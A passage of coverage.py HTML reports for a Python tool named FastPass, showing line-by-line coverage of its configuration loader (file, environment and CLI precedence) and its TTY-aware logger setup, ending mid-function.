    <p class="mis show_mis"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">                        <span class="nam">file_config</span> <span class="op">=</span> <span class="nam">json</span><span class="op">.</span><span class="nam">load</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t">                        <span class="nam">config</span><span class="op">.</span><span class="nam">update</span><span class="op">(</span><span class="nam">file_config</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t">                <span class="key">except</span> <span class="op">(</span><span class="nam">json</span><span class="op">.</span><span class="nam">JSONDecodeError</span><span class="op">,</span> <span class="nam">IOError</span><span class="op">)</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t">                    <span class="nam">print</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Warning: Could not load config from </span><span class="op">{</span><span class="nam">config_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">        <span class="com"># 2. Load from environment variables</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">        <span class="nam">env_config</span> <span class="op">=</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">_load_from_environment</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">        <span class="nam">config</span><span class="op">.</span><span class="nam">update</span><span class="op">(</span><span class="nam">env_config</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t">        <span class="com"># 3. Override with CLI arguments (highest precedence)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t">        <span class="nam">cli_config</span> <span class="op">=</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">_extract_cli_config</span><span class="op">(</span><span class="nam">cli_args</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t63" href="#t63">63</a></span><span class="t">        <span class="nam">config</span><span class="op">.</span><span class="nam">update</span><span class="op">(</span><span class="nam">cli_config</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t64" href="#t64">64</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t65" href="#t65">65</a></span><span class="t">        <span class="key">return</span> <span class="nam">config</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t66" href="#t66">66</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t67" href="#t67">67</a></span><span class="t">    <span class="op">@</span><span class="nam">classmethod</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t68" href="#t68">68</a></span><span class="t">    <span class="key">def</span> <span class="nam">_get_default_config</span><span class="op">(</span><span class="nam">cls</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t69" href="#t69">69</a></span><span class="t">        <span class="str">"""Default configuration values"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t70" href="#t70">70</a></span><span class="t">        <span class="key">return</span> <span class="op">{</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t71" href="#t71">71</a></span><span class="t">            <span class="str">'max_file_size'</span><span class="op">:</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">MAX_FILE_SIZE</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t72" href="#t72">72</a></span><span class="t">            <span class="str">'temp_dir_prefix'</span><span class="op">:</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">TEMP_DIR_PREFIX</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t73" href="#t73">73</a></span><span class="t">            <span class="str">'secure_permissions'</span><span class="op">:</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">SECURE_FILE_PERMISSIONS</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t74" href="#t74">74</a></span><span class="t">            <span class="str">'supported_formats'</span><span class="op">:</span> <span class="nam">cls</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">.</span><span class="nam">copy</span><span class="op">(</span><span class="op">)</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t75" href="#t75">75</a></span><span class="t">            <span class="str">'debug'</span><span class="op">:</span> <span class="key">False</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t76" href="#t76">76</a></span><span class="t">            <span class="str">'verify'</span><span class="op">:</span> <span class="key">False</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t77" href="#t77">77</a></span><span class="t">            <span class="str">'dry_run'</span><span class="op">:</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t78" href="#t78">78</a></span><span class="t">        <span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t79" href="#t79">79</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t80" href="#t80">80</a></span><span class="t">    <span class="op">@</span><span class="nam">classmethod</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t81" href="#t81">81</a></span><span class="t">    <span class="key">def</span> <span class="nam">_load_from_environment</span><span class="op">(</span><span class="nam">cls</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t82" href="#t82">82</a></span><span class="t">        <span class="str">"""Load configuration from environment variables"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t83" href="#t83">83</a></span><span class="t">        <span class="nam">env_config</span> <span class="op">=</span> <span class="op">{</span><span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t84" href="#t84">84</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t85" href="#t85">85</a></span><span class="t">        <span class="com"># Check for FASTPASS_* environment variables</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t86" href="#t86">86</a></span><span class="t">        <span class="key">if</span> <span class="nam">os</span><span class="op">.</span><span class="nam">getenv</span><span class="op">(</span><span class="str">'FASTPASS_DEBUG'</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t87" href="#t87">87</a></span><span class="t">            <span class="nam">env_config</span><span class="op">[</span><span class="str">'debug'</span><span class="op">]</span> <span class="op">=</span> <span class="nam">os</span><span class="op">.</span><span class="nam">getenv</span><span class="op">(</span><span class="str">'FASTPASS_DEBUG'</span><span class="op">)</span><span class="op">.</span><span class="nam">lower</span><span class="op">(</span><span class="op">)</span> <span class="key">in</span> <span class="op">(</span><span class="str">'1'</span><span class="op">,</span> <span class="str">'true'</span><span class="op">,</span> <span class="str">'yes'</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t88" href="#t88">88</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t89" href="#t89">89</a></span><span class="t">        <span class="key">if</span> <span class="nam">os</span><span class="op">.</span><span class="nam">getenv</span><span class="op">(</span><span class="str">'FASTPASS_MAX_FILE_SIZE'</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t90" href="#t90">90</a></span><span class="t">            <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t91" href="#t91">91</a></span><span class="t">                <span class="nam">env_config</span><span class="op">[</span><span class="str">'max_file_size'</span><span class="op">]</span> <span class="op">=</span> <span class="nam">int</span><span class="op">(</span><span class="nam">os</span><span class="op">.</span><span class="nam">getenv</span><span class="op">(</span><span class="str">'FASTPASS_MAX_FILE_SIZE'</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t92" href="#t92">92</a></span><span class="t">            <span class="key">except</span> <span class="nam">ValueError</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t93" href="#t93">93</a></span><span class="t">                <span class="key">pass</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t94" href="#t94">94</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t95" href="#t95">95</a></span><span class="t">        <span class="key">return</span> <span class="nam">env_config</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t96" href="#t96">96</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t97" href="#t97">97</a></span><span class="t">    <span class="op">@</span><span class="nam">classmethod</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t98" href="#t98">98</a></span><span class="t">    <span class="key">def</span> <span class="nam">_extract_cli_config</span><span class="op">(</span><span class="nam">cls</span><span class="op">,</span> <span class="nam">cli_args</span><span class="op">:</span> <span class="nam">argparse</span><span class="op">.</span><span class="nam">Namespace</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t99" href="#t99">99</a></span><span class="t">        <span class="str">"""Extract configuration from CLI arguments"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t100" href="#t100">100</a></span><span class="t">        <span class="nam">cli_config</span> <span class="op">=</span> <span class="op">{</span><span class="op">}</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t101" href="#t101">101</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t102" href="#t102">102</a></span><span class="t">        <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">cli_args</span><span class="op">,</span> <span class="str">'debug'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">cli_args</span><span class="op">.</span><span class="nam">debug</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t103" href="#t103">103</a></span><span class="t">            <span class="nam">cli_config</span><span class="op">[</span><span class="str">'debug'</span><span class="op">]</span> <span class="op">=</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t104" href="#t104">104</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t105" href="#t105">105</a></span><span class="t">        <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">cli_args</span><span class="op">,</span> <span class="str">'verify'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">cli_args</span><span class="op">.</span><span class="nam">verify</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t106" href="#t106">106</a></span><span class="t">            <span class="nam">cli_config</span><span class="op">[</span><span class="str">'verify'</span><span class="op">]</span> <span class="op">=</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t107" href="#t107">107</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t108" href="#t108">108</a></span><span class="t">        <span class="key">if</span> <span class="nam">hasattr</span><span class="op">(</span><span class="nam">cli_args</span><span class="op">,</span> <span class="str">'dry_run'</span><span class="op">)</span> <span class="key">and</span> <span class="nam">cli_args</span><span class="op">.</span><span class="nam">dry_run</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t109" href="#t109">109</a></span><span class="t">            <span class="nam">cli_config</span><span class="op">[</span><span class="str">'dry_run'</span><span class="op">]</span> <span class="op">=</span> <span class="key">True</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t110" href="#t110">110</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t111" href="#t111">111</a></span><span class="t">        <span class="key">return</span> <span class="nam">cli_config</span>&nbsp;</span><span class="r"></span></p>
</main>
<footer>
    <div class="content">
        <p>
            <a class="nav" href="z_6156a86a215061be___init___py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a class="nav" href="z_6156a86a215061be_logger_py.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
    </div>
</footer>
</body>
</html>
</file>

<file path="reports/coverage/z_6156a86a215061be_logger_py.html">
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Coverage for src\utils\logger.py: 73%</title>
    <link rel="icon" sizes="32x32" href="favicon_32_cb_58284776.png">
    <link rel="stylesheet" href="style_cb_dca529e9.css" type="text/css">
    <script src="coverage_html_cb_497bf287.js" defer></script>
</head>
<body class="pyfile">
<header>
    <div class="content">
        <h1>
            <span class="text">Coverage for </span><b>src\utils\logger.py</b>:
            <span class="pc_cov">73%</span>
        </h1>
        <aside id="help_panel_wrapper">
            <input id="help_panel_state" type="checkbox">
            <label for="help_panel_state">
                <img id="keyboard_icon" src="keybd_closed_cb_ce680311.png" alt="Show/hide keyboard shortcuts">
            </label>
            <div id="help_panel">
                <p class="legend">Shortcuts on this page</p>
                <div class="keyhelp">
                    <p>
                        <kbd>r</kbd>
                        <kbd>m</kbd>
                        <kbd>x</kbd>
                        &nbsp; toggle line displays
                    </p>
                    <p>
                        <kbd>j</kbd>
                        <kbd>k</kbd>
                        &nbsp; next/prev highlighted chunk
                    </p>
                    <p>
                        <kbd>0</kbd> &nbsp; (zero) top of page
                    </p>
                    <p>
                        <kbd>1</kbd> &nbsp; (one) first highlighted chunk
                    </p>
                    <p>
                        <kbd>[</kbd>
                        <kbd>]</kbd>
                        &nbsp; prev/next file
                    </p>
                    <p>
                        <kbd>u</kbd> &nbsp; up to the index
                    </p>
                    <p>
                        <kbd>?</kbd> &nbsp; show/hide this help
                    </p>
                </div>
            </div>
        </aside>
        <h2>
            <span class="text">41 statements &nbsp;</span>
            <button type="button" class="run button_toggle_run" value="run" data-shortcut="r" title="Toggle lines run">30<span class="text"> run</span></button>
            <button type="button" class="mis show_mis button_toggle_mis" value="mis" data-shortcut="m" title="Toggle lines missing">11<span class="text"> missing</span></button>
            <button type="button" class="exc show_exc button_toggle_exc" value="exc" data-shortcut="x" title="Toggle lines excluded">0<span class="text"> excluded</span></button>
        </h2>
        <p class="text">
            <a id="prevFileLink" class="nav" href="z_6156a86a215061be_config_py.html">&#xab; prev</a> &nbsp; &nbsp;
            <a id="indexLink" class="nav" href="index.html">&Hat; index</a> &nbsp; &nbsp;
            <a id="nextFileLink" class="nav" href="index.html">&#xbb; next</a>
            &nbsp; &nbsp; &nbsp;
            <a class="nav" href="https://coverage.readthedocs.io/en/7.10.0">coverage.py v7.10.0</a>,
            created at 2025-07-26 17:08 -0400
        </p>
        <aside class="hidden">
            <button type="button" class="button_next_chunk" data-shortcut="j"></button>
            <button type="button" class="button_prev_chunk" data-shortcut="k"></button>
            <button type="button" class="button_top_of_page" data-shortcut="0"></button>
            <button type="button" class="button_first_chunk" data-shortcut="1"></button>
            <button type="button" class="button_prev_file" data-shortcut="["></button>
            <button type="button" class="button_next_file" data-shortcut="]"></button>
            <button type="button" class="button_to_index" data-shortcut="u"></button>
            <button type="button" class="button_show_hide_help" data-shortcut="?"></button>
        </aside>
    </div>
</header>
<main id="source">
    <p class="pln"><span class="n"><a id="t1" href="#t1">1</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t2" href="#t2">2</a></span><span class="t"><span class="str">FastPass Logging Configuration</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t3" href="#t3">3</a></span><span class="t"><span class="str">Maps to: A3a-A3e Enhanced Logging Setup with TTY Detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t4" href="#t4">4</a></span><span class="t"><span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t5" href="#t5">5</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t6" href="#t6">6</a></span><span class="t"><span class="com"># A1a: Load System Tools</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t7" href="#t7">7</a></span><span class="t"><span class="key">import</span> <span class="nam">logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t8" href="#t8">8</a></span><span class="t"><span class="key">import</span> <span class="nam">sys</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t9" href="#t9">9</a></span><span class="t"><span class="key">import</span> <span class="nam">os</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t10" href="#t10">10</a></span><span class="t"><span class="key">from</span> <span class="nam">pathlib</span> <span class="key">import</span> <span class="nam">Path</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t11" href="#t11">11</a></span><span class="t"><span class="key">from</span> <span class="nam">datetime</span> <span class="key">import</span> <span class="nam">datetime</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t12" href="#t12">12</a></span><span class="t"><span class="key">from</span> <span class="nam">typing</span> <span class="key">import</span> <span class="nam">Optional</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t13" href="#t13">13</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t14" href="#t14">14</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t15" href="#t15">15</a></span><span class="t"><span class="key">def</span> <span class="nam">setup_logger</span><span class="op">(</span><span class="nam">name</span><span class="op">:</span> <span class="nam">str</span> <span class="op">=</span> <span class="str">"fastpass"</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t16" href="#t16">16</a></span><span class="t">                <span class="nam">debug</span><span class="op">:</span> <span class="nam">bool</span> <span class="op">=</span> <span class="key">False</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t17" href="#t17">17</a></span><span class="t">                <span class="nam">log_file</span><span class="op">:</span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">Path</span><span class="op">]</span> <span class="op">=</span> <span class="key">None</span><span class="op">)</span> <span class="op">-></span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t18" href="#t18">18</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t19" href="#t19">19</a></span><span class="t"><span class="str">    A3a: Configure Console and File Logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t20" href="#t20">20</a></span><span class="t"><span class="str">    Detect TTY for appropriate log formatting</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t21" href="#t21">21</a></span><span class="t"><span class="str">    Set up both console and optional file logging</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t22" href="#t22">22</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t23" href="#t23">23</a></span><span class="t">    <span class="nam">logger</span> <span class="op">=</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">getLogger</span><span class="op">(</span><span class="nam">name</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t24" href="#t24">24</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t25" href="#t25">25</a></span><span class="t">    <span class="com"># Clear any existing handlers</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t26" href="#t26">26</a></span><span class="t">    <span class="nam">logger</span><span class="op">.</span><span class="nam">handlers</span><span class="op">.</span><span class="nam">clear</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t27" href="#t27">27</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t28" href="#t28">28</a></span><span class="t">    <span class="com"># Set log level</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t29" href="#t29">29</a></span><span class="t">    <span class="nam">logger</span><span class="op">.</span><span class="nam">setLevel</span><span class="op">(</span><span class="nam">logging</span><span class="op">.</span><span class="nam">DEBUG</span> <span class="key">if</span> <span class="nam">debug</span> <span class="key">else</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">INFO</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t30" href="#t30">30</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t31" href="#t31">31</a></span><span class="t">    <span class="com"># A3b: Set Up TTY-Aware Progress Tracking</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t32" href="#t32">32</a></span><span class="t">    <span class="com"># TTY: Full timestamp format for console display</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t33" href="#t33">33</a></span><span class="t">    <span class="com"># Non-TTY: Simple format for file redirection</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t34" href="#t34">34</a></span><span class="t">    <span class="nam">is_tty</span> <span class="op">=</span> <span class="nam">sys</span><span class="op">.</span><span class="nam">stdout</span><span class="op">.</span><span class="nam">isatty</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t35" href="#t35">35</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t36" href="#t36">36</a></span><span class="t">    <span class="key">if</span> <span class="nam">is_tty</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t37" href="#t37">37</a></span><span class="t">        <span class="com"># A3c: Initialize Multi-Handler Logger - TTY format</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t38" href="#t38">38</a></span><span class="t">        <span class="nam">console_format</span> <span class="op">=</span> <span class="str">"%(asctime)s [%(levelname)s] %(name)s: %(message)s"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t39" href="#t39">39</a></span><span class="t">        <span class="nam">date_format</span> <span class="op">=</span> <span class="str">"%Y-%m-%d %H:%M:%S"</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t40" href="#t40">40</a></span><span class="t">    <span class="key">else</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t41" href="#t41">41</a></span><span class="t">        <span class="com"># Non-TTY: Simple format for file redirection</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t42" href="#t42">42</a></span><span class="t">        <span class="nam">console_format</span> <span class="op">=</span> <span class="str">"[%(levelname)s] %(message)s"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t43" href="#t43">43</a></span><span class="t">        <span class="nam">date_format</span> <span class="op">=</span> <span class="key">None</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t44" href="#t44">44</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t45" href="#t45">45</a></span><span class="t">    <span class="com"># Create console handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t46" href="#t46">46</a></span><span class="t">    <span class="nam">console_handler</span> <span class="op">=</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">StreamHandler</span><span class="op">(</span><span class="nam">sys</span><span class="op">.</span><span class="nam">stdout</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t47" href="#t47">47</a></span><span class="t">    <span class="nam">console_formatter</span> <span class="op">=</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Formatter</span><span class="op">(</span><span class="nam">console_format</span><span class="op">,</span> <span class="nam">datefmt</span><span class="op">=</span><span class="nam">date_format</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t48" href="#t48">48</a></span><span class="t">    <span class="nam">console_handler</span><span class="op">.</span><span class="nam">setFormatter</span><span class="op">(</span><span class="nam">console_formatter</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t49" href="#t49">49</a></span><span class="t">    <span class="nam">logger</span><span class="op">.</span><span class="nam">addHandler</span><span class="op">(</span><span class="nam">console_handler</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t50" href="#t50">50</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t51" href="#t51">51</a></span><span class="t">    <span class="com"># A3c: Add file handler if --log-file specified</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t52" href="#t52">52</a></span><span class="t">    <span class="key">if</span> <span class="nam">log_file</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t53" href="#t53">53</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t54" href="#t54">54</a></span><span class="t">            <span class="com"># Ensure log directory exists</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t55" href="#t55">55</a></span><span class="t">            <span class="nam">log_file</span><span class="op">.</span><span class="nam">parent</span><span class="op">.</span><span class="nam">mkdir</span><span class="op">(</span><span class="nam">parents</span><span class="op">=</span><span class="key">True</span><span class="op">,</span> <span class="nam">exist_ok</span><span class="op">=</span><span class="key">True</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t56" href="#t56">56</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t57" href="#t57">57</a></span><span class="t">            <span class="nam">file_handler</span> <span class="op">=</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">FileHandler</span><span class="op">(</span><span class="nam">log_file</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t58" href="#t58">58</a></span><span class="t">            <span class="nam">file_format</span> <span class="op">=</span> <span class="str">"%(asctime)s [%(levelname)s] %(name)s:%(lineno)d: %(message)s"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t59" href="#t59">59</a></span><span class="t">            <span class="nam">file_formatter</span> <span class="op">=</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Formatter</span><span class="op">(</span><span class="nam">file_format</span><span class="op">,</span> <span class="nam">datefmt</span><span class="op">=</span><span class="str">"%Y-%m-%d %H:%M:%S"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t60" href="#t60">60</a></span><span class="t">            <span class="nam">file_handler</span><span class="op">.</span><span class="nam">setFormatter</span><span class="op">(</span><span class="nam">file_formatter</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t61" href="#t61">61</a></span><span class="t">            <span class="nam">logger</span><span class="op">.</span><span class="nam">addHandler</span><span class="op">(</span><span class="nam">file_handler</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t62" href="#t62">62</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
